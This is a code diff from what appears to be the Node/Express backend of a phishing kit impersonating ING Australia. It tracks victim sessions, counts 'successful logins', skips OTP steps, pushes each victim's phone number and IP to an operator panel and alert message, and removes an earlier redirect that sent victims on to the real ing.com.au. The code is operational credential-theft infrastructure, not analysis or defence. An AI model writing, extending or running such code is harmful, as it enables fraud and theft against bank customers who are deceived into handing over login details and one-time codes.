@@ -445,22 +445,14 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
-// FIXED: Status endpoint now returns full session data including page and redirect for quick approve
+// FIXED: Status endpoint now returns full session data including page
 app.get('/api/status/:sid', (req, res) => {
   const v = sessionsMap.get(req.params.sid);
   if (!v) return res.json({ status: 'gone' });
-  
-  const response = { 
+  res.json({ 
     status: v.status,
-    page: v.page
-  };
-  
-  // If approved via skip, include redirect URL
-  if (v.status === 'approved' && v.page === 'success' && v.quickApprove) {
-    response.redirect = 'https://www.ing.com.au';
-  }
-  
-  res.json(response);
+    page: v.page  // Include page for checking success/approved
+  });
 });
 
 app.post('/api/clearRedo', (req, res) => {
@@ -603,7 +595,6 @@ app.post('/api/skip', (req, res) => {
   // Skip unregister and otp, go straight to success
   v.page = 'success';
   v.status = 'approved';
-  v.quickApprove = true;  // Mark as quick approve
   successfulLogins++;
   
   // Update audit log with current data
@@ -623,11 +614,11 @@ app.post('/api/skip', (req, res) => {
     `Phone: <code>${v.phone}</code>\n` +
     `IP: ${v.ip}\n` +
     `Time: ${new Date().toLocaleString()}\n` +
-    `<i>Quick approval from verify page - redirecting to ing.com.au</i>`
+    `<i>Quick approval from verify page</i>`
   );
   
   emitPanelUpdate();
-  res.json({ ok: true, redirect: 'https://www.ing.com.au' });
+  res.json({ ok: true });
 });
 
 /* ----------  SESSION REFRESH  ---------- */
